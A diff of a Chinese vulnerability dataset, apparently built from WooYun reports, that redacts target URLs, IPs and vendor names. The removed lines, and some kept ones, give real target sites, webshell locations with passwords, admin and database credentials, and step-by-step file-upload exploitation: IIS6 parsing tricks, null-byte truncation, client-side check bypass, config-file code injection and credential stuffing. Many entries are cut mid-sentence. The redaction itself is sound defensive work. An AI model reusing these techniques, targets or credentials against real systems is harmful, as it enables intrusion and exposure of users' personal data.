-**详情**: http://www.chanjet.com/workbench/cardhttp://www.uu.com.cn/user/st#user.st/user.photohttp://dev.chanjet.com/user/000000000000000000031401http://wpzs.chanjet.com/index.html#Setting/photohttp://ccpup.chanjet.com/upindex.html#以上网站都存在弱口令账号密码chanjet好多站点都支持头像等上传我就拿其中一个举例http://www.uu.com.cn/user/st#user.st/user.photo/burpsuite抓包然后直接发到repeater修改文件后缀及文件内容上传php的 要在后缀加空格其他网站我就不深入了
+**详情**: https://example.com/[已脱敏] 要在后缀加空格其他网站我就不深入了
 
 **POC**: (见原文)
 
@@ -10916,9 +10916,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://cssurvey.foxconn.com/admin/study.aspx
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://cssurvey.foxconn.com/Templatehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/1.aspx密码admin
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10926,7 +10926,7 @@
 ---
 
 ---
-### [wooyun-2015-0130184] 中国电信某合作商户业务系统任意文件上传漏洞
+### [wooyun-2015-0130184] 某运营商某合作商户业务系统任意文件上传漏洞
 **厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
@@ -10938,9 +10938,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国电信某合作商户业务系统任意文件上传漏洞
+**详情**: 某运营商某合作商户业务系统任意文件上传漏洞
 
-**POC**: http://www.fjhsh.cn/这是与中国电信合作的商户优惠卷一些活动的平台，此网站可下载优惠卷到指定商户享受打折优惠。http://www.fjhsh.cn/act/filepic.html这里可进行任意格式文件上传直接连SHELL 看看查看下数据库连接文件连上数据库发现业务后台：http://www.fjhsh.cn:81/default.htm在数据库中查找密码，进入后台密码都是明文的，，顺便看下注册用户是多少用户名：admin  密码：aatest123  直接登录后台来看看这个业务平台有哪些功能短信群发功能更改商户优惠促销信息可对APP客户端的内容进行更改可查看到别人优惠卷内
+**POC**: https://example.com/[已脱敏] 看看查看下数据库连接文件连上数据库发现业务后台：https://example.com/[已脱敏]  密码：aatest123  直接登录后台来看看这个业务平台有哪些功能短信群发功能更改商户优惠促销信息可对APP客户端的内容进行更改可查看到别人优惠卷内
 
 **绕过**: 直接利用
 
@@ -10960,9 +10960,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://58.213.19.68/users/sign_in苏宁广场手机客户端后台管理系统http://58.213.19.68/users/sign_up 可以注册账号然后登陆点进入后台是无权限访问的 但是 系统使用rb开发错误信息回显了所有的route
+**详情**: http://[IP已脱敏] 可以注册账号然后登陆点进入后台是无权限访问的 但是 系统使用rb开发错误信息回显了所有的route
 
-**POC**: 然后就可以照着地图找功能了 完全没有访问限制比如查看所有用户 编辑任意用户可以任意修改发布新闻 奖品 电影 活动 等等等可任意文件上传 可惜脚本不解析 不过html还是可以的http://58.213.19.68/uploads/user/avatar/14893/1.txt
+**POC**: 然后就可以照着地图找功能了 完全没有访问限制比如查看所有用户 编辑任意用户可以任意修改发布新闻 奖品 电影 活动 等等等可任意文件上传 可惜脚本不解析 不过html还是可以的http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -10982,9 +10982,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中化江苏有限公司http://www.sinochemjiangsu.com/login.aspx发现系统存在fck编辑器于是
+**详情**: 中化江苏有限公司https://example.com/[已脱敏]
 
-**POC**: 发现已成马场，我也上传一个shell，利用iis6解析漏洞一句话地址：http://www.sinochemjiangsu.com/uploads/file/1.asp/33.jpg密码：1在系统内还发现旁站的代码江苏省援外医疗网江苏省卫生国际交流信息管理系统网站http://jsywyl.cn/
+**POC**: 发现已成马场，我也上传一个shell，利用iis6解析漏洞一句话地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11006,7 +11006,7 @@
 
 **详情**: 漏洞文件：/sofprogecslive/live/uploadfile.jsp/sofprogecsinterview/interview/uploadfile.jsp上传中对文件类型采用客户端js验证，本地禁用js，直接上传jsp脚本即可。
 
-**POC**: 教育部网站：http://www.moe.edu.cn/sofprogecslive/live/uploadfile.jsphttp://www.moe.edu.cn/sofprogecsinterview/interview/uploadfile.jsp
+**POC**: 教育部网站：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11048,7 +11048,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://edu.yy.com/agency/auth/applyStep2?agencyType=1上传处。你懂等级较低 原因是对服务器威胁较小。
+**详情**: https://example.com/[已脱敏] 原因是对服务器威胁较小。
 
 **POC**: (见原文)
 
@@ -11070,9 +11070,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 寿险业务系统http://59.151.39.85/pre/1#任意文件上传在扫描该系统的时候，我发现了一个urlhttp://59.151.39.85/prehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/default.htm点进去好像还可以上传http://59.151.39.85/prehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/sample1.htm上传成功，但坑爹的是没有回显自己尝试了一下，发现就在当前上传目录http://59.151.39.85/prehttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/wooyun.jpg然后，我试了一下直接上传jsphttp://59.151.39.85/pre
+**详情**: 寿险业务系统http://[IP已脱敏]
 
-**POC**: 2#任意文件下载http://59.151.39.85/pre/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hosts与我之前提交的漏洞WooYun: 国华人寿某系统存在任意文件下载漏洞同一套系统，但不同ip比如http://59.151.39.85/pre/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hosts显示的是# Do not remove the following line, or various programs # that require network functionality will
+**POC**: 2#任意文件下载http://[IP已脱敏] 国华人寿某系统存在任意文件下载漏洞同一套系统，但不同ip比如http://[IP已脱敏] Do not remove the following line, or various programs # that require network functionality will
 
 **绕过**: 直接利用
 
@@ -11092,9 +11092,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新为软件E-learning管理系统,使用的企业挺多的官网列表：http://www.newv.com.cn/fileroot/bos/content/news/case/bgkh/list.htmlg.cn关键词,通过不同的模板名搜索不同企业。inurl:nwc_755_newvexaminurl:nwc_user_cloudinurl:nwc_user_enterprise前提条件是需要登录，但很多企业都存在弱口令，如:test 密码test、123456
+**详情**: 新为软件E-learning管理系统,使用的企业挺多的官网列表：https://example.com/[已脱敏] 密码test、123456
 
-**POC**: http://exam.qdgw.edu.cn/customize/nwc_user_newvexam/login/login.html  test 123456http://112.253.20.33:8080/customize/nwc_user_enterprise/login/login.html test test上传地址http://exam.qdgw.edu.cn/user/JEditor/UploadFile.aspx?IsUploadCloud=N&TargetRootPath=notifyReceipt&receiptUid=?删除style="display:none" 
+**POC**: https://example.com/[已脱敏]  test 123456http://[IP已脱敏] test test上传地址https://example.com/[已脱敏]"display:none" 
 
 **绕过**: 直接利用
 
@@ -11114,9 +11114,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某公文签收系统存在上传漏洞+多处SQL注射。这几套CMS都存在同一种上传漏洞和SQL注射。1.SQL注射漏洞。出现在 qtlooker.asp  qtdisp.asp  qtlist.asp等文件中，可谷歌搜索：inurl:qtdisp.asp?disp_id=案例如下：http://oa.bzrkjs.gov.cn/qtdisp.asp?disp_id=1522http://www.clhszxx.cn/gwqs/qtdisp.asp?disp_id=1488http://www.84891.com/qtdisp.asp?disp_id=1149http://www.pw8.cn/qtlist.asp?id=17http://www.cjkchina.net/qtlist.asp?id=362http://www.zdct.cn/gwqs/qtlooker.asp?look_id=123
+**详情**: 某公文签收系统存在上传漏洞+多处SQL注射。这几套CMS都存在同一种上传漏洞和SQL注射。1.SQL注射漏洞。出现在 qtlooker.asp  qtdisp.asp  qtlist.asp等文件中，可谷歌搜索：inurl:qtdisp.asp?disp_id=案例如下：https://example.com/[已脱敏]
 
-**POC**: 2.存在上传漏洞，配合IIS解析漏洞就可拿到shell。问题存在于in_file.asp文件中，缺陷代码如下：上传漏洞地址：/in_file.asp?file_name=1.asp;1上传后的shell地址：/upfile/1.asp;1.jpg案例如下：http://www.zdct.cn/gwqs//in_file.asp?file_name=1.asp;1http://oa.bzrkjs.gov.cn//in_file.asp?file_name=1.asp;1http://wsbg.nhtyxx.com//in_file.asp?file_name=1.asp;1http://www.
+**POC**: 2.存在上传漏洞，配合IIS解析漏洞就可拿到shell。问题存在于in_file.asp文件中，缺陷代码如下：上传漏洞地址：/in_file.asp?file_name=1.asp;1上传后的shell地址：/upfile/1.asp;1.jpg案例如下：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11136,7 +11136,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用友U8+开发交流平台:http://u8dev.yonyou.com上传地址：http://u8dev.yonyou.com/default1.aspx上传限制了格式 然后修改上传类型突破上传添加asp后缀后直接传个一句话 然后菜刀连接随后在根目录看到了数据库配置文件value="server=10.10.3.240;uid=sa;pwd=uf*0000;database=u8Kmsns;Pooling=truesa权限，连接数据库查询NT_user表数据:SELECT * FROM NT_user ORDER BY 1 DESC就这样一处小小的上传导致了1W8的内部员工数据泄露。发现大部分都是用友邮箱注册的，那么可以去mail.yonyou.com撞库登录 有可能会得到更多的敏感信息。另外NT_userinfo这个表里有用户的联系方式。
+**详情**: 用友U8+开发交流平台:https://example.com/[已脱敏] 然后修改上传类型突破上传添加asp后缀后直接传个一句话 然后菜刀连接随后在根目录看到了数据库配置文件value="server=[IP已脱敏];uid=sa;pwd=uf*0000;database=u8Kmsns;Pooling=truesa权限，连接数据库查询NT_user表数据:SELECT * FROM NT_user ORDER BY 1 DESC就这样一处小小的上传导致了1W8的内部员工数据泄露。发现大部分都是用友邮箱注册的，那么可以去mail.yonyou.com撞库登录 有可能会得到更多的敏感信息。另外NT_userinfo这个表里有用户的联系方式。
 
 **POC**: 如上。
 
@@ -11226,7 +11226,7 @@
 
 **详情**: Discuz!某自带程序存在任意代码写入漏洞Discuz! X 系列产品升级/转换程序，utility\convert\include\global.func.php文件中的save_config_file函数过滤不够严格，导致可写入任意代码至\data\config.inc.php文件。
 
-**POC**: #1 漏洞利用http://bbs.kangq.com/convert/index.php?a=setting&source=d7.2_x1.5不解释上菜刀：eth0      Link encap:Ethernet  HWaddr 5C:F3:FC:B9:7E:0Cinet addr:192.168.0.117  Bcast:192.168.10.255  Mask:255.255.255.0inet6 addr: fe80::5ef3:fcff:feb9:7e0c/64 Scope:LinkUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+**POC**: #1 漏洞利用https://example.com/[已脱敏]      Link encap:Ethernet  HWaddr 5C:F3:FC:B9:7E:0Cinet addr:[IP已脱敏]  Bcast:[IP已脱敏]  Mask:[IP已脱敏]inet6 addr: fe80::5ef3:fcff:feb9:7e0c/64 Scope:LinkUP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
 
 **绕过**: 直接利用
 
@@ -11246,9 +11246,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 海尔家居项目综合管理平台jboss漏洞，存在漏洞的URL：http://218.58.70.201
+**详情**: 海尔家居项目综合管理平台jboss漏洞，存在漏洞的URL：http://[IP已脱敏]
 
-**POC**: 开放大量端口直接部署SHELL文件URLhttp://218.58.70.201:8080/myname/ce.jsp 密码xxxxxx开启3389 端口转发登录远程桌面大量用户增加账号提升管理员权限，获取管理员账号密码。
+**POC**: 开放大量端口直接部署SHELL文件URLhttp://[IP已脱敏] 密码xxxxxx开启3389 端口转发登录远程桌面大量用户增加账号提升管理员权限，获取管理员账号密码。
 
 **绕过**: 直接利用
 
@@ -11290,7 +11290,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、http://v2.shenzhenair.com/ 弱口令test/test进入会议时需要输入会议密码，但对输入次数无限制，可爆破，然后进入深航的内部会议。2、biz.shenzhenair.com Fckeditor，可创建文件夹、上传文件等，但无法解析，最好还是升级下编辑器版本
+**详情**: 1、https://example.com/[已脱敏] 弱口令test/test进入会议时需要输入会议密码，但对输入次数无限制，可爆破，然后进入深航的内部会议。2、biz.shenzhenair.com Fckeditor，可创建文件夹、上传文件等，但无法解析，最好还是升级下编辑器版本
 
 **POC**: 如上
 
@@ -11312,9 +11312,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 越权案例如下：http://www.anlice.com/ceping/HouAdmin/GLGWUsers.aspxhttp://www.tobdclub.com/ceping/HouAdmin/GLGWUsers.aspxhttp://xt100.cn//ceping/HouAdmin/GLGWUsers.aspxhttp://www.china21nec.com/ceping/HouAdmin/GLGWUsers.aspxhttp://www.gzedu100.com/ceping/HouAdmin/GLGWUsers.aspx1.测试案例:http://www.gzedu100.com/ceping/HouAdmin/GLGWUsers.aspx直接明文密码啊。。2.测试案例:http://www.china21nec.com/ceping/HouAdmin/GLGWUsers.a
+**详情**: 越权案例如下：https://example.com/[已脱敏]
 
-**POC**: 1.测试案例:http://xitong.mingjuan.net/ceping/fckeditor/editor/filemanager/connectors/test.htmlhttp://xitong.mingjuan.net/ceping/Uploads/file/1.asp/ccc.jpg1.测试案例:http://www.gzedu100.com/ceping/HouAdmin/GLGWUsers.aspx直接明文密码啊。。2.测试案例:http://www.china21nec.com/ceping/HouAdmin/GLGWUsers.aspx
+**POC**: 1.测试案例:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11334,9 +11334,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 厂商信息：中软融兴是中软总公司旗下专门从事金融领域软件开发、系统集成、产品代理、技术服务的专业化公司，在行业应用系统开发与服务、自主产品创新研发等方面具有雄厚实力和成熟经验。存在漏洞产品：中软融兴CMS是一套面向金融、政府领域的高端CMS系统，基于j2ee和mysql。漏洞信息：中软融兴CMS列目录与后台上传漏洞。由于未对browser.jsp文件中的webapppath参数进行过滤和指定路径，使得攻击者可以修改并构造相对路径来访问磁盘中其他目录并列出文件。漏洞证明：1、文件遍历修改webappath参数为../或其他。http://www.yjrb.com.cn/cms/common/filechooseold/browser.jsp?webapppath=../htdocs/web/&uploadpath=/
+**详情**: 厂商信息：中软融兴是中软总公司旗下专门从事金融领域软件开发、系统集成、产品代理、技术服务的专业化公司，在行业应用系统开发与服务、自主产品创新研发等方面具有雄厚实力和成熟经验。存在漏洞产品：中软融兴CMS是一套面向金融、政府领域的高端CMS系统，基于j2ee和mysql。漏洞信息：中软融兴CMS列目录与后台上传漏洞。由于未对browser.jsp文件中的webapppath参数进行过滤和指定路径，使得攻击者可以修改并构造相对路径来访问磁盘中其他目录并列出文件。漏洞证明：1、文件遍历修改webappath参数为../或其他。https://example.com/[已脱敏]
 
-**POC**: 厂商信息：中软融兴是中软总公司旗下专门从事金融领域软件开发、系统集成、产品代理、技术服务的专业化公司，在行业应用系统开发与服务、自主产品创新研发等方面具有雄厚实力和成熟经验。存在漏洞产品：中软融兴CMS是一套面向金融、政府领域的高端CMS系统，基于j2ee和mysql。漏洞信息：中软融兴CMS列目录与后台上传漏洞。由于未对browser.jsp文件中的webapppath参数进行过滤和指定路径，使得攻击者可以修改并构造相对路径来访问磁盘中其他目录并列出文件。漏洞证明：1、文件遍历修改webappath参数为../或其他。http://www.yjrb.com.cn/cms/common/fil
+**POC**: 厂商信息：中软融兴是中软总公司旗下专门从事金融领域软件开发、系统集成、产品代理、技术服务的专业化公司，在行业应用系统开发与服务、自主产品创新研发等方面具有雄厚实力和成熟经验。存在漏洞产品：中软融兴CMS是一套面向金融、政府领域的高端CMS系统，基于j2ee和mysql。漏洞信息：中软融兴CMS列目录与后台上传漏洞。由于未对browser.jsp文件中的webapppath参数进行过滤和指定路径，使得攻击者可以修改并构造相对路径来访问磁盘中其他目录并列出文件。漏洞证明：1、文件遍历修改webappath参数为../或其他。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11356,7 +11356,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.tclbusiness.com/之前因为爆出phpcms 上传漏洞 拿到的 但是现在访问 马子还在 可能漏洞还没被修复
+**详情**: https://example.com/[已脱敏] 上传漏洞 拿到的 但是现在访问 马子还在 可能漏洞还没被修复
 
 **POC**: 之前因为爆出phpcms 上传漏洞 拿到的 但是现在访问 马子还在 可能漏洞还没被修复
 
@@ -11378,9 +11378,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 公司名：北京思路创新科技有限公司搜索：http://www.google.de/#newwindow=1&q=inurl:enterprise-info!getCompanyInfo.action上传成功会自动返回路径。似乎之前我好多洞都没确认为通用……这个总该给确认了吧……
+**详情**: 公司名：北京思路创新科技有限公司搜索：https://example.com/[已脱敏]
 
-**POC**: 注意返回的路径。有可能需要拼接到自定义的文件夹后面。http://www.xjmic.com/enterprisemonitor/uploadFileings.action<html><form action="http://www.xjmic.com/enterprisemonitor/uploadFileings.action" name="test" method="post" enctype="multipart/form-data"><input type="file" name="fujian" size="23" id="file" /><input type="submit" 
+**POC**: 注意返回的路径。有可能需要拼接到自定义的文件夹后面。https://example.com/[已脱敏] action="https://example.com/[已脱敏]" name="test" method="post" enctype="multipart/form-data"><input type="file" name="fujian" size="23" id="file" /><input type="submit" 
 
 **绕过**: 直接利用
 
@@ -11400,7 +11400,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.seed.org.tw/这个网站fck 2.4.2编辑器的，版本比较低。http://www.seed.org.tw/fckeditor/editor/dialog/fck_about.htmliis 7.5，诶感觉没戏。上传时候竟然没改名称http://www.seed.org.tw/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html心里有点小激动啊，但是上传小马，菜刀连不了，提示405,直接大马的话，登陆后，啥反应都没有，好奇怪。试了几个都没用。弄个文件上传的小马试试。然后上传大马，直接上传到网站根目录下面这个别人13年的马，被入侵很久啦。
+**详情**: https://example.com/[已脱敏] 2.4.2编辑器的，版本比较低。https://example.com/[已脱敏] 7.5，诶感觉没戏。上传时候竟然没改名称https://example.com/[已脱敏]
 
 **POC**: 运维人员的安全意识有待提高啊，这么直接备份，感觉很危险啊，如果备份，名称可以改的复杂点不，不然很容易猜测到的，或者不要放网站目录，直接删掉吧
 
@@ -11422,7 +11422,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 刚看到学校新开了一个助学二学历预报名系统，就顺手一试，问题还不少首先注入点http://zkzs.nau.edu.cn/1/sm.asp?id=1很快就跑到了后台管理密码，还是明文存储，另外这个密码直接就是一个弱口令，q开头、p结尾，看看键盘就知道了进入后台预报名了二学历的妹子真不少，身份证（qq字段）、手机、宿舍（想想还有点小激动呢）、班级、学号等等信息都有学长的打码技术有限。。。。不要吐槽我。。。因为本来就有这个系统主站的后门（好吧，我错了，写完这个我就去提交另一个洞洞。。。），所以直接菜刀连上去，看到上传处妹子的照片真尼玛多然后在一堆图片里看到。。。。耶呵，有人来过，5月21号和6月18号，都是"时间戳.asp",应该还有上传漏洞，怀揣着保护学妹的各种伟大精神，再看看去退出管理后，妹子们的信息照样看，没有任何过滤和验证措施，猜猜id呗比如：http://zkzs.nau.edu.cn
+**详情**: 刚看到学校新开了一个助学二学历预报名系统，就顺手一试，问题还不少首先注入点https://example.com/[已脱敏]"时间戳.asp",应该还有上传漏洞，怀揣着保护学妹的各种伟大精神，再看看去退出管理后，妹子们的信息照样看，没有任何过滤和验证措施，猜猜id呗比如：https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -11450,7 +11450,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 发现某分站内存在一句话木马！！！！！！管理员，2013-01-02 这半年来你？还有我注册完账号之后，马上有一个QQ号为1915859247（广西人才…）加我，如果是你们的人员，那就忽略，如果不是你们的人员，那.…修复完成后全部改一次密码吧。不怪程序员，真的不怪，信息泄露往往就是小缺陷造成的，常检查
+**修复**: 发现某分站内存在一句话木马！！！！！！管理员，2013-01-02 这半年来你？还有我注册完账号之后，马上有一个某互联网公司号为1915859247（广西人才…）加我，如果是你们的人员，那就忽略，如果不是你们的人员，那.…修复完成后全部改一次密码吧。不怪程序员，真的不怪，信息泄露往往就是小缺陷造成的，常检查
 ---
 
 ---
@@ -11466,9 +11466,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某企业网站程序存在任意文件上传和SQL注射漏洞。关键字搜索：inurl:zhaoshang.asp?bid=1.SQL注射。案例如下：http://www.tangciliucao.cn/zhaoshang.asp?bid=22&sid=70http://www.powerhg.com/zhaoshang.asp?bid=22&sid=70http://www.pxtl.com/dj/zhaoshang.asp?bid=22&sid=70http://www.jsszpc.com/zhaoshang.asp?bid=22&sid=70http://www.china-saint.com/zhaoshang.asp?bid=22&sid=70http://www.jsszpc.com/zhaoshang.asp?bid=22&sid=70http://www.jindamuye.com/zh
+**详情**: 某企业网站程序存在任意文件上传和SQL注射漏洞。关键字搜索：inurl:zhaoshang.asp?bid=1.SQL注射。案例如下：https://example.com/[已脱敏]
 
-**POC**: 2.存在任意文件上传漏洞，可直接上传asp文件。上传漏洞地址：/upload_flash.asp给出案例如下：http://www.hnsying.com/upload_flash.asphttp://www.jindamuye.com/upload_flash.asphttp://www.china-saint.com/upload_flash.asphttp://www.tangciliucao.cn/upload_flash.asphttp://www.zjwish.com//upload_flash.asphttp://www.pxtl.com/dj/upload_flash.asp证
+**POC**: 2.存在任意文件上传漏洞，可直接上传asp文件。上传漏洞地址：/upload_flash.asp给出案例如下：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11488,7 +11488,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 拿到图片上传服务器后，并没有停止脚步，因为这个IP段的主机挺多的，继续进行同IP段的主机扫描。。。发现了一个盛大客服应用后台：http://service.os.sdo.com/frames/login.aspx各种弱口令爆破不成功。。。返回图片上传服务器。。。在数据库遍历中，突然发现了一个问题。。上次81端口服务器中也有数据表AUTH_USER，应该AUTH_USER是每个后台应用盛大基友的登录数据。。而在这个图片服务器中，不仅有AUTH_USER表，还有PerAdminSys_系列表不过翻看这站，貌似没有后台应用啊。。。难道。。 存在数据库共用？？ 这不是一个站的数据库，而是多个站共用数据库？如果是共用，那么此表对应的后台在哪呢。。。难道就是http://service.os.sdo.com ？？？于是打开了PerAdminSys_UserInfo表，找到了一些管理员信息。和AUTH_
+**详情**: 拿到图片上传服务器后，并没有停止脚步，因为这个IP段的主机挺多的，继续进行同IP段的主机扫描。。。发现了一个盛大客服应用后台：https://example.com/[已脱敏] 存在数据库共用？？ 这不是一个站的数据库，而是多个站共用数据库？如果是共用，那么此表对应的后台在哪呢。。。难道就是https://example.com/[已脱敏] ？？？于是打开了PerAdminSys_UserInfo表，找到了一些管理员信息。和AUTH_
 
 **POC**: (见原文)
 
@@ -11510,9 +11510,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 福建省网上办事大厅问题出在注册功能（法人用户注册）此处有个上传图片功能上传一张图片后抓包,可以得到以下POST http://www.fjbs.gov.cn/AppFile.action?fn=upload HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4User-Agent: Shockwave FlashHost: www.fjbs.gov.cnContent-Length: 662Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=72EC54DE5E80DA5D0B1BFDA78F2514F1; CNZZDATA1254004469=1094158662-14
+**详情**: 福建省网上办事大厅问题出在注册功能（法人用户注册）此处有个上传图片功能上传一张图片后抓包,可以得到以下POST https://example.com/[已脱敏] HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------Ef1ae0ae0cH2ei4KM7gL6GI3KM7ei4User-Agent: Shockwave FlashHost: www.fjbs.gov.cnContent-Length: 662Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=72EC54DE5E80DA5D0B1BFDA78F2514F1; CNZZDATA1254004469=1094158662-14
 
-**POC**: 对上面的数据包中的fileext进行修改，加上jspx即可（系统对jsp马有限制上传）Content-Disposition: form-data; name="fileext"*.gif;*.jpg;*.jpeg;*.png;*.jspx;上传一句话上传成功后服务器会返回文件路径一句话地址：upload/80B6F7EFCC3D2930ECA8CF14497BE937_wooyun.jspx密码：woo0yunhttp://www.fjbs.gov.cnhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/80B6F7EFCC3D2930
+**POC**: 对上面的数据包中的fileext进行修改，加上jspx即可（系统对jsp马有限制上传）Content-Disposition: form-data; name="fileext"*.gif;*.jpg;*.jpeg;*.png;*.jspx;上传一句话上传成功后服务器会返回文件路径一句话地址：upload/80B6F7EFCC3D2930ECA8CF14497BE937_wooyun.jspx密码：woo0yunhttps://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11576,7 +11576,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.lzgd.com.cn/http://oa.lzgd.com.cn:8000/OA使用了通达的系统。然后有个任意上传WooYun: 通达OA存在任意文件上传漏洞机器在域内。可继续渗透随便截了几个图.. 证明我来过。 我什么都没干。
+**详情**: https://example.com/[已脱敏] 通达OA存在任意文件上传漏洞机器在域内。可继续渗透随便截了几个图.. 证明我来过。 我什么都没干。
 
 **POC**: 见详细说明。
 
@@ -11586,8 +11586,8 @@
 ---
 
 ---
-### [wooyun-2014-063724] 中国移动通信某管理平台弱口令几任意文件上传漏洞
-**厂商**: 中国移动通信 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2014-063724] 某运营商通信某管理平台弱口令几任意文件上传漏洞
+**厂商**: 某运营商通信 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -11598,7 +11598,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国移动绥化移动分公司服务监督管理系统http://222.32.90.7:8080/弱口令：admin 123456编辑器附件上传那里可以上传任意文件！到这里就不深究了，马上提交，测试上传的文件和后门那目录打不开，你们自己解决吧！
+**详情**: 某运营商绥化移动分公司服务监督管理系统http://[IP已脱敏] 123456编辑器附件上传那里可以上传任意文件！到这里就不深究了，马上提交，测试上传的文件和后门那目录打不开，你们自己解决吧！
 
 **POC**: (见原文)
 
@@ -11622,7 +11622,7 @@
 
 **详情**: 东软的这个数字校园平台用于高校实现统一的门户平台管理、统一的身份管理以及统一的数据标准管理，其客户包括中国人民大学、暨南大学、西北工业大学等（其开发的其他行业中的程序是否存在这个漏洞未测试），该平台采用tinymce编辑器，这个编辑器本身不存在漏洞，东软进行了修改，在tiny_mce/plugins/advimage/uoload.jsp页面，查看源代码：本地构造上传表单，白名单中加上jsp, 上传后可直接在源代码中查看后门地址由于高校数字校园平台都需要该校的账号才能进入，漏洞利用存在一定难度，测试本校成功后，网上找了人民大学的账号进行了测试，成功。
 
-**POC**: http://portal.ruc.edu.cn/eapdomain/1.txt
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -11664,9 +11664,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某一个action有点问题，可以用00截断截断文件名，然后……http://www.zjna.gov.cn/ecoi/upload.jsppost数据到http://www.zjna.gov.cn/ecoi/lee/upload.action
+**详情**: 某一个action有点问题，可以用00截断截断文件名，然后……https://example.com/[已脱敏]
 
-**POC**: 给一个POST的数据包的例子：POST http://www.zjna.gov.cn/ecoi/lee/upload.action HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://www.zjna.go
+**POC**: 给一个POST的数据包的例子：POST https://example.com/[已脱敏] HTTP/1.1Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: https://example.com/[已脱敏]
 
 **绕过**: 截断攻击
 
@@ -11686,9 +11686,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标地址：http://219.131.221.59:8080/任意文件下载：http://219.131.221.59:8080/download.fe?filePath=/WEB-INF/web.xml
+**详情**: 目标地址：http://[IP已脱敏]
 
-**POC**: 任意文件上传，可直接上传jsp文件：http://219.131.221.59:8080/common/uploadFile.jspPOST http://219.131.221.59:8080/common/uploadFile.jsp?action=save&savePath=/imageshttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/&fileName=15042815250003.jpg.jsp&title1= ļ  ϴ &title2=ѡ   ļ   &allowsize=null HTTP/1.1Accept: text
+**POC**: 任意文件上传，可直接上传jsp文件：http://[IP已脱敏] http://[IP已脱敏] ļ  ϴ &title2=ѡ   ļ   &allowsize=null HTTP/1.1Accept: text
 
 **绕过**: 直接利用
 
@@ -11730,7 +11730,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.zjnb.lss.gov.cn/system/FunPages/Frame.jsp?FileName=UpFileForm.jsp&Path=/Files可以任意上传JSP文件，文件保存目录可以自定，修改/files即可。未对上传文件重命名！
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -11752,7 +11752,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.sn.stats.gov.cn/zmhd.asp?menuId=2011&pmenuId=20建议提交页面附件上传直接ASP成功
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 然后此漏洞已经被黑帽利用挂上了黄色网址
 
@@ -11776,7 +11776,7 @@
 
